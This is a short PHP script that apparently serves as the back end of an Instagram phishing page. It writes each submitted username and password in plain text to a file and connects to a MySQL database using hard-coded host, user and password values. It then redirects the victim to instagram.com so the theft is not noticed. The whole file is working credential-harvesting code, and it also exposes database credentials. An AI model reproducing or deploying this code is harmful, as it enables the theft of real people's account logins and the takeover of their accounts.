<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

$connection = mysqli_connect('sql306.epizy.com','epiz_31235925','eORLAdHHMvoWsf','epiz_31235925_instagram');

if($connection)
{
echo "true";
}
else
{
echo "false"; 
}

header('Location: https://instagram.com');
exit();
?>
